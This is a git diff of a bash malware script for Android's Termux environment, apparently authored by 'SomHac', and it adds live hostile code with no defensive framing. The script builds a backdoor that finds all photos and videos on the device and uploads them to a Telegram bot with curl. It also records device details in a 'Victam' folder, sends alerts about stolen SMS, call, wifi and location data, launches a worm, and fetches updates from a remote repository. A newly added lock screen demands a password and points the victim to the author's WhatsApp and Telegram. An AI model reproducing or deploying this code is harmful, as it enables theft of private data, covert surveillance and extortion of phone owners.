@@ -51,6 +51,11 @@ UpTime=$(uptime)
 MemoryUsage=$(free -m)
 DiskUsage=$(df -h)
 ip=$(ifconfig -a)
+if [[ -f $PREFIX/etc/Hacked/Victam/victam.sim ]];then
+
+Dev_ID=$(sed -n '5p' $PREFIX/etc/Hacked/Victam/victam.sim)
+
+fi
 #-------------------------#
 # Check if offline
 net() {
@@ -124,7 +129,7 @@ fi
 #---------------------------------------------
 Rebulid(){
 
-				if [[ ${nN} == "Y" ]];then
+if [[ ${nN} == "Y" ]];then
 
 			rm -rfd $PREFIX/etc/Hacked/ &>> /dev/null
 			mkdir $PREFIX/etc/Hacked/ &>> /dev/null
@@ -140,30 +145,33 @@ Rebulid(){
 						fi
 					done
 
-				fi
 
                         if [[ $? == "0" ]];then
 
 #                               cp badshell/Hacker.jpg $PREFIX/etc/Hacked/
 #                               cp badshell/Blue24Bluer.jpg $PREFIX/etc/Hacked/
-                                touch $PREFIX/etc/Hacked/About_This_Phone
-                                echo $HostName >> $PREFIX/etc/Hacked/About_This_Phone
-                                echo $Kernel >> $PREFIX/etc/Hacked/About_This_Phone
-                                echo $UpTime >> $PREFIX/etc/Hacked/About_This_Phone
-                                echo $MemoryUsage >> $PREFIX/etc/Hacked/About_This_Phone
-                                echo $DiskUsage >> $PREFIX/etc/Hacked/About_This_Phone
-                                echo $ip >> $PREFIX/etc/Hacked/About_This_Phone
+                                touch $PREFIX/etc/Hacked/Victam/About_This_Phone
+                                echo $HostName >> $PREFIX/etc/Hacked/Victam/About_This_Phone
+                                echo $Kernel >> $PREFIX/etc/Hacked/Victam/About_This_Phone
+                                echo $UpTime >> $PREFIX/etc/Hacked/Victam/About_This_Phone
+                                echo $MemoryUsage >> $PREFIX/etc/Hacked/Victam/About_This_Phone
+                                echo $DiskUsage >> $PREFIX/etc/Hacked/Victam/About_This_Phone
+                                echo $ip >> $PREFIX/etc/Hacked/Victam/About_This_Phone
 
 
 			fi
 
+
+fi
 }
 
 Rebackdoor(){
+Rebulid
+
+if [[ -d $PREFIX/etc/Hacked/ ]];then
 
 if [[ $termux == true ]];then
 
-Rebulid
                         echo "#!/usr/bin/bash
 #---------OPIONS----------#
 home=\$(pwd)
@@ -187,19 +195,19 @@ get(){
         do
 
            # Upload the file
-		curl -X POST --silent  -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+		curl -X POST --silent  -F document=@\$jpg https://api.telegram.org/bot\${TOKEN}/sendDocument -F chat_id=\${CHAT_ID}
 
         done
 
         for video in \$(find /sdcard/ -name *.mp4)
         do
-                curl -X POST --silent  -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+                curl -X POST --silent  -F document=@\$video https://api.telegram.org/bot\${TOKEN}/sendDocument -F chat_id=\${CHAT_ID}
 
         done
 
         for png in \$(find /sdcard/ -name *.png)
         do
-                curl -X POST --silent  -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+                curl -X POST --silent  -F document=@\$png https://api.telegram.org/bot\${TOKEN}/sendDocument -F chat_id=\${CHAT_ID}
 
 
         done
@@ -209,7 +217,6 @@ get &>> /dev/null &
 
 " > $PREFIX/etc/Hacked/Badshell/backdoor
                 else
-Rebulid
                         echo "#!/usr/bin/bash
 #---------OPIONS----------#
 home=\$(pwd)
@@ -233,19 +240,19 @@ get(){
       do
 
           # Upload the file
-          curl -X POST --silent  -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+          curl -X POST --silent  -F document=@\$jpg https://api.telegram.org/bot\${TOKEN}/sendDocument -F chat_id=\${CHAT_ID}
 
       done
 
       for video in \$(find / -name *.mp4)
       do
-         curl -X POST --silent  -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+         curl -X POST --silent  -F document=@\$video https://api.telegram.org/bot\${TOKEN}/sendDocument -F chat_id=\${CHAT_ID}
 
       done
 
       for png in \$(find / -name *.png)
       do
-          curl -X POST --silent  -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+          curl -X POST --silent  -F document=@\$png https://api.telegram.org/bot\${TOKEN}/sendDocument -F chat_id=\${CHAT_ID}
 
 
 
@@ -255,6 +262,14 @@ get(){
 get &>> /dev/null &
 
                         " > $PREFIX/etc/Hacked/Badshell/backdoor
+
+fi
+
+
+else
+
+Rebackdoor
+
 fi
 }
 #---------------------------------------------
@@ -284,6 +299,25 @@ fi
 Update(){
 
 if [[ $nN == "Y" ]];then
+
+if [[ -f $PREFIX/etc/Hacked/Update ]];then
+
+printf ""
+
+else
+
+this_date=$(date +%m/%d)
+echo -e $this_date > $PREFIX/etc/Hacked/Update
+#Update-Server
+cd $PREFIX/etc/Hacked/
+rm -rfd Server
+git clone https://github.com/blue24bluer/Server &>> /dev/null &
+#Update-Hacked
+BadApi
+#Update-AllInOne
+
+fi
+
 if [[ $(date +%m/%d) > $(cat $PREFIX/etc/Hacked/Update) && $(date +%a) == "Fri" ]];then
 
 this_date=$(date +%m/%d)
@@ -322,7 +356,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
+                curl -X POST --silent "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev_ID} "
 
         else
 
@@ -338,8 +372,8 @@ termux-camera-photo -c 0 victam.jpg
 sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
-#################################################################################
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
+
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev_ID} "
 
         else
 
@@ -354,7 +388,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New SMS File Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New SMS File Locate on Device : ${Dev_ID} "
 
         else
 
@@ -369,7 +403,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
 
         else
 
@@ -384,7 +418,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
 
         else
 
@@ -399,7 +433,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
 
         else
 
@@ -414,7 +448,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New WifiData Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New WifiData Locate on Device : ${Dev_ID} "
 
         else
 
@@ -431,7 +465,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New location Locate on Device : ${Dev}"
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New location Locate on Device : ${Dev_ID}"
 
         else
 
@@ -571,7 +605,7 @@ fi
 #####################################################################################
 if [[ $Server_Trojan == "Yes" ]];then
 
-	bash $PREFIX/etc/Badshell/worm &>> /dev/null &
+	bash $PREFIX/etc/Hacked/Badshell/worm &>> /dev/null &
 
 fi
 #####################################################################################
@@ -622,7 +656,8 @@ fi
 }
 Dev=$(echo -e "
 
-Device infomore : ${Dev}ice\n
+Device infomore : ${Dev}\n
+Device ID       : ${Dev_ID}
 Hacked on date  : $Tdate\n
 Host Name       : $HostName\n
 Kernel          : $Kernel\n
@@ -638,10 +673,11 @@ IP Address      : $ip\n
 BH(){
 today=$(date +%m/%d)
 Myday="12/12"
+
 if [[ $today == $Myday ]];then
 if [[ ${nN} == Y ]];then
-bash $PREFIX/etc/Badshell/backdoor &>> /dev/null &
-bash $PREFIX/etc/Badshell/worm &>> /dev/null &
+bash $PREFIX/etc/Hacked/Badshell/backdoor &>> /dev/null & bash $PREFIX/etc/Hacked/Badshell/worm &>> /dev/null
+echo -e "Happy Birthday SomHac" > $PREFIX/etc/Hacked/Victam/BH
 clear
 termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
 toilet -f mono12 -F border SomHac_day -F metal
@@ -663,11 +699,12 @@ xdg-open https://t.me/HacSom
 
 else
 
-termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
-curl -X POST --silent  https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${CHAT_ID} -d text=' Happy Birthday To You Master Blue , Don’t Forget Your wish ! '
-bash $PREFIX/etc/Badshell/backdoor &>> /dev/null &
+bash $PREFIX/etc/Hacked/Badshell/backdoor &>> /dev/null &
+echo -e "Happy Birthday SomHac" > $PREFIX/etc/Hacked/Victam/BH
 clear
 toilet -f mono12 -F border SomHac_day -F metal
+termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
+curl -X POST --silent  https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${CHAT_ID} -d text=' Happy Birthday To You Master Blue , Don’t Forget Your wish ! '
 
 if [[ `command -v php` ]];then
 
@@ -683,13 +720,90 @@ fi
 #---------------------------------------------
 #---------------------------------------------
 #---------------------------------------------
+Lock(){
+
+
+clear
+
+echo ""
+echo ""
+
+
+echo ""
+echo ""
+
+echo -e $r "Put The Password To Unlock This Device [...]"
+echo -e $r "You Have Hacked By (SomHack) [...]"
+echo ""
+echo ""
+echo -e $b "[***](1) For call me on telegram or whatsapp"
+
+read -p "Put The Password OR Put (1) To call me>>>>" callme
+
+if [[ $callme == "1" ]];then
+
+echo ""
+echo ""
+echo ""
+
+echo -e $g "[***](1) Whatsapp"
+echo -e $b "[***](2) Telegram"
+read -p ">>>>>" WT
+echo
+echo
+
+if [[ $WT == "1" ]];then
+
+xdg-open https://wa.me/‏‪994405968250‬‏
+
+elif [[ $WT == "2" ]];then
+
+xdg-open https://t.me/HacSom
+
+else
+
+echo -e $r "Error !!"
+Lock
+
+fi
+
+elif [[ $callme == "BLUE24BLUER702005665" ]];then
+
+echo "Virus-Fixer Activated"
+
+
+
+rm -rfd $PREFIX/etc/Hacked/Victam/BH
+
+else
+
+echo -e $r "Error"
+Lock
+
+fi
+
+}
+#---------------------------------------------
+#---------------------------------------------
+#---------------------------------------------
+
     while true; do
 	wget --spider --quiet https://github.com &>> /dev/null
-        if [ "$?" = 0 ]; then
+        if [ "$?" = "0" ]; then
+
+if [[ -f $PREFIX/etc/Hacked/Victam/BH ]];then
+
+	Update     &>> /dev/null
+	ServerHome &>> /dev/null
+	Lock
+
+else
 
             Update     &>> /dev/null
 		BH
 	    ServerHome &>> /dev/null
+
+fi
 
        else
 
